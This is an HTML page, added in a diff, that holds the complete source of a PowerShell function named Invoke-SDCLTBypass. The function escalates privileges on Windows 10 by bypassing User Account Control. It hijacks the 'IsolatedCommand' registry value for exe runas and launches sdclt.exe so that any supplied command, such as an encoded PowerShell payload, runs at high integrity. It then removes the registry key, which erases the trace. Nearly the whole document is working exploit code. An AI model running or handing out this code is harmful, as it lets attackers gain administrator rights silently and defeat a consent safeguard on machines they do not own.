@@ -1,0 +1,94 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Invoke-SDCLTBypass</title>
+</head><body>function Invoke-SDCLTBypass {<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+<br/>
+Bypasses UAC by hijacking the "IsolatedCommand" value in "shell\runas\command"<br/>
+Only tested on Windows 10<br/>
+<br/>
+Author: Matt Nelson (@enigma0x3)<br/>
+License: BSD 3-Clause<br/>
+Required Dependencies: None<br/>
+Optional Dependencies: None<br/>
+<br/>
+<br/>
+.PARAMETER Command<br/>
+<br/>
+&nbsp;Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc &lt;encodedCommand&gt;"<br/>
+&nbsp;Easiest test is "C:\Windows\System32\cmd.exe /c notepad.exe"<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+Invoke-SDCLTBypass -Command "C:\Windows\System32\cmd.exe /c notepad.exe"<br/>
+<br/>
+This will start notepad.exe in high-integrity context.<br/>
+<br/>
+#&gt;<br/>
+<br/>
+&nbsp; &nbsp; [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]<br/>
+&nbsp; &nbsp; Param (<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True)]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Command,<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Force<br/>
+&nbsp; &nbsp; )<br/>
+&nbsp; &nbsp; $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin<br/>
+&nbsp; &nbsp; $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop<br/>
+<br/>
+&nbsp; &nbsp; if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; "UAC is set to 'Always Notify'. This module does not bypass this setting."<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Begin Execution<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; New-Item $exeCommandPath -Force |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; New-ItemProperty -Name 'IsolatedCommand' -Value $Command -PropertyType string -Force | Out-Null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Key already exists, consider using -Force"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (Test-Path $exeCommandPath) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Created registry entries to hijack the exe runas extension"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Failed to create registry key, exiting"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Started sdclt.exe"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Sleep 5 seconds <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Sleeping 5 seconds to trigger payload"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (-not $PSBoundParameters['WhatIf']) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep -Seconds 5<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $exefilePath = "HKCU:\Software\Classes\exefile"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (Test-Path $exefilePath) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #Remove the registry entry<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Remove-Item $exefilePath -Recurse -Force<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Removed registry entries"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Stop-Process -Id $Process.Id<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Killed running sdclt process"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+</body></html>
